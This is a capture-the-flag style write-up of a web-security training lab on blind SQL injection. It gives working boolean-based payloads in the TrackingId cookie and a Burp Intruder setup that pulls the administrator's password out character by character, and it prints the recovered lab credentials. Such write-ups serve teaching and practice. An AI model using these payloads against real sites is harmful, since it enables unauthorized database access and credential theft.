## Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Hint :

You can assume that the password only contains lowercase, alphanumeric characters.

## Notes

- `/login`
- `/filter?category=parameter`
- Vulnerable cookie : `TrackingId`

## Resume

1. Identify SQL injection in `TrackingId`
2. Confirm boolean-based behavior
3. Extract administrator password with Intruder
4. Login as administrator

## Solve

The request used by the application :

```http
GET /filter?category=Gifts HTTP/2
Host: 0a64005e04081b928285c0d800e400a8.web-security-academy.net
Cookie: TrackingId=sGeitOX5pdX9unH1; session=ZcyV6eZC7EOqjrXfskNdxOr2QDBJ4JNi
```

The `TrackingId` cookie is vulnerable to SQL injection.

Testing with :

```sql
TrackingId=sGeitOX5pdX9unH1' AND '1'='1
```

returns the `Welcome back` message.

Using :

```sql
TrackingId=sGeitOX5pdX9unH1' AND '1'='0
```

removes the message, confirming the blind SQL injection.

To extract the administrator password manually :

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

If the condition is true, the response contains `Welcome back`.

To automate the extraction, send the request to Burp Intruder and create a Cluster Bomb attack.

Use the following payload positions :

```sql
TrackingId=sGeitOX5pdX9unH1' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
```

- Position `§1§` → numbers from `1` to `20`
- Position `§a§` → `a-z0-9`

Add a grep match on :

```text
Welcome back
```

The matching responses reveal the administrator password character by character.

Administrator password :

```text
9scxmediukclh9x48821
```

Login with :

```text
administrator:9scxmediukclh9x48821
```


